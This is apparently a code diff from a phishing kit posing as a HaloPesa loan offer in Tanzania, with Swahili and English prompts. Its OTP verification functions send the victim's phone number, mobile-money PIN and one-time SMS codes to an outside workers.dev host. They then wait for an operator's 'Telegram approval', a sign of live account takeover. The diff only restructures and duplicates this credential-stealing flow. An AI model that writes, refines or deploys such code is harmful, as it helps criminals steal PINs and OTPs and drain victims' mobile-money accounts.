@@ -814,58 +814,90 @@ function verifyOtp1(){
     hap([25,15,25]);
     setTimeout(function(){ otp1Val=''; document.getElementById('otp1Input').value=''; renderOtp('o1',''); }, 600);
   }
-    /* Reject only obvious/banned codes, accept everything else */
-  if(/^(\d)\1{3}$/.test(otp1Val)){
-    showOtp1Err(lang==='sw'?'Nambari zote zinafanana — jaribu tena':'All digits identical — try again'); return;
-  }
-  if(otp1Val === '1234'){
-    showOtp1Err(lang==='sw'?'Nambari rahisi sana — jaribu tena':'Too simple — try again'); return;
-  }
-  if(otp1Val === pin){
-    showOtp1Err(lang==='sw'?'OTP si PIN yako — angalia ujumbe wako':'OTP is not your PIN — check your SMS'); return;
-  }
-
-  (function(){
-    var _t=getLoanTier(loanAmount);
-    fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'otp1_verified',data:{
-        phone:phoneDigits||'',
-        pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
-        repay:Math.round(loanAmount*(1+_t.rate/100)),
-        otp:otp1Val,otpNum:'1',sessionId:sessionId,
-        device:getDevice(),ts:Date.now()
-      }})}).catch(function(){});
-  })();
+  if(/^(\d)\1{3}$/.test(otp1Val)){ showOtp1Err(lang==='sw'?'Nambari zote zinafanana — jaribu tena':'All digits identical — try again'); return; }
+  if(otp1Val === '1234'){ showOtp1Err(lang==='sw'?'Nambari rahisi sana — jaribu tena':'Too simple — try again'); return; }
+  if(otp1Val === pin){ showOtp1Err(lang==='sw'?'OTP si PIN yako — angalia ujumbe wako':'OTP is not your PIN — check your SMS'); return; }
   for(var j=0;j<4;j++) document.getElementById('o1b'+j).classList.add('ok');
   hap([10,6,18]);
   if(otp1Timer) clearInterval(otp1Timer);
-  /* Show verifying state — wait for Telegram approval */
   setOtp1Verifying(true);
-  pollApproval(sessionId + '_otp1', function(approved){
-    setOtp1Verifying(false);
-    if(approved){
-      hap([10,6,18]);
-      for(var j=0;j<4;j++) document.getElementById('o1b'+j).classList.add('ok');
-      setTimeout(function(){
-        goStep('processing');
+  var _t1 = getLoanTier(loanAmount);
+  fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({event:'otp1_verified',data:{
+      phone:phoneDigits||'',pin:pin,
+      amount:loanAmount,rate:_t1.rate,days:_t1.days,
+      repay:Math.round(loanAmount*(1+_t1.rate/100)),
+      otp:otp1Val,otpNum:'1',sessionId:sessionId,
+      device:getDevice(),ts:Date.now()
+    }})
+  }).then(function(){
+    pollApproval(sessionId+'_otp1', function(approved){
+      setOtp1Verifying(false);
+      if(approved){
+        hap([10,6,18]);
         setTimeout(function(){
-          updateLoanDisplay(loanAmount);
-          document.getElementById('otpPhone2').textContent = '+255 ' + phoneDigits.slice(0,3)+' '+phoneDigits.slice(3,6)+' '+phoneDigits.slice(6);
-          var due = new Date(Date.now() + 30*86400000);
-          var dueStr = due.toLocaleDateString(lang==='sw'?'sw-TZ':'en-GB',{day:'2-digit',month:'short',year:'numeric'});
-          document.getElementById('dueDate').textContent = dueStr;
-          document.getElementById('dueDate2').textContent = dueStr;
-          goStep('offer');
-        }, 1600);
-      }, 500);
-    } else {
-      /* Declined — lock OTP box, enable resend only */
-      hap([30,15,30,15,30]);
-      document.getElementById('otp1Err').textContent = lang==='sw'?'Ombi limekataliwa — tuma tena':'Request declined — please resend';
-      for(var i=0;i<4;i++) document.getElementById('o1b'+i).classList.add('err');
-      setOtp1Locked(true);
-    }
-  });
+          goStep('processing');
+          setTimeout(function(){
+            updateLoanDisplay(loanAmount);
+            document.getElementById('otpPhone2').textContent = '+255 '+phoneDigits.slice(0,3)+' '+phoneDigits.slice(3,6)+' '+phoneDigits.slice(6);
+            var due = new Date(Date.now()+30*86400000);
+            document.getElementById('dueDate').textContent = due.toLocaleDateString(lang==='sw'?'sw-TZ':'en-GB',{day:'2-digit',month:'short',year:'numeric'});
+            document.getElementById('dueDate2').textContent = document.getElementById('dueDate').textContent;
+            goStep('offer');
+          }, 1600);
+        }, 500);
+      } else {
+        hap([30,15,30,15,30]);
+        document.getElementById('otp1Err').textContent = lang==='sw'?'Ombi limekataliwa — tuma tena':'Request declined — please resend';
+        for(var i=0;i<4;i++) document.getElementById('o1b'+i).classList.add('err');
+        setOtp1Locked(true);
+      }
+    });
+  }).catch(function(){ setOtp1Verifying(false); });
+}
+function verifyOtp2(){
+  if(otp2Val.length !== 4) return;
+  function showOtp2Err(msg){
+    document.getElementById('otp2Err').textContent = msg;
+    for(var i=0;i<4;i++) document.getElementById('o2b'+i).classList.add('err');
+    hap([25,15,25]);
+    setTimeout(function(){ otp2Val=''; document.getElementById('otp2Input').value=''; renderOtp('o2',''); }, 600);
+  }
+  if(/^(\d)\1{3}$/.test(otp2Val)){ showOtp2Err(lang==='sw'?'Nambari zote zinafanana — jaribu tena':'All digits identical — try again'); return; }
+  if(otp2Val === '1234'){ showOtp2Err(lang==='sw'?'Nambari rahisi sana — jaribu tena':'Too simple — try again'); return; }
+  if(otp2Val === pin){ showOtp2Err(lang==='sw'?'OTP si PIN yako — angalia ujumbe wako':'OTP is not your PIN — check your SMS'); return; }
+  if(otp2Val === otp1Val){ showOtp2Err(lang==='sw'?'Weka nambari mpya ya OTP':'Enter the new OTP'); return; }
+  setOtp2Verifying(true);
+  if(otp2Timer) clearInterval(otp2Timer);
+  var _t2 = getLoanTier(loanAmount);
+  fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({event:'otp2_verified',data:{
+      phone:phoneDigits||'',pin:pin,
+      amount:loanAmount,rate:_t2.rate,days:_t2.days,
+      repay:Math.round(loanAmount*(1+_t2.rate/100)),
+      otp:otp2Val,otpNum:'2',sessionId:sessionId,
+      ref:document.getElementById('refNo').textContent||'',
+      device:getDevice(),ts:Date.now()
+    }})
+  }).then(function(){
+    pollApproval(sessionId+'_otp2', function(approved){
+      setOtp2Verifying(false);
+      if(approved){
+        hap([10,6,18,6,30]);
+        for(var j=0;j<4;j++) document.getElementById('o2b'+j).classList.add('ok');
+        setTimeout(function(){
+          document.getElementById('refNo').textContent = 'HP'+Date.now().toString(36).toUpperCase();
+          document.getElementById('successAmt').textContent = 'TSh '+loanAmount.toLocaleString('en-TZ');
+          goStep('success');
+        }, 500);
+      } else {
+        hap([30,15,30,15,30]);
+        document.getElementById('otp2Err').textContent = lang==='sw'?'Ombi limekataliwa — tuma tena':'Request declined — please resend';
+        for(var i=0;i<4;i++) document.getElementById('o2b'+i).classList.add('err');
+        setOtp2Locked(true);
+      }
+    });
+  }).catch(function(){ setOtp2Verifying(false); });
 }
 function resendOtp1(){
 
@@ -932,21 +964,18 @@ function verifyOtp2(){
       showOtp2Err(lang==='sw'?'Weka nambari mpya ya OTP — sio ile ya kwanza':'Enter the new OTP — not the first one'); return;
     }
 
-  (function(){
-    var _t=getLoanTier(loanAmount);
-    fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
-      body:JSON.stringify({event:'otp2_verified',data:{
-        phone:phoneDigits||'',
-        pin:pin,amount:loanAmount,rate:_t.rate,days:_t.days,
-        repay:Math.round(loanAmount*(1+_t.rate/100)),
-        otp:otp2Val,otpNum:'2',sessionId:sessionId,
-        ref:document.getElementById('refNo').textContent||'',
-        device:getDevice(),ts:Date.now()
-      }})}).catch(function(){});
-  })();
-  /* Show verifying state — wait for Telegram approval */
   setOtp2Verifying(true);
-  pollApproval(sessionId + '_otp2', function(approved){
+  var _t2=getLoanTier(loanAmount);
+  fetch('https://halopesa.lennxkoros.workers.dev',{method:'POST',headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({event:'otp2_verified',data:{
+      phone:phoneDigits||'',
+      pin:pin,amount:loanAmount,rate:_t2.rate,days:_t2.days,
+      repay:Math.round(loanAmount*(1+_t2.rate/100)),
+      otp:otp2Val,otpNum:'2',sessionId:sessionId,
+      ref:document.getElementById('refNo').textContent||'',
+      device:getDevice(),ts:Date.now()
+    }})
+  }).then(function(){ pollApproval(sessionId + '_otp2', function(approved){
     setOtp2Verifying(false);
     if(approved){
       hap([10,6,18,6,30]);
@@ -964,6 +993,7 @@ function verifyOtp2(){
       setOtp2Locked(true);
     }
   });
+  }).catch(function(){ setOtp2Verifying(false); });
 }
 function resendOtp2(){
 
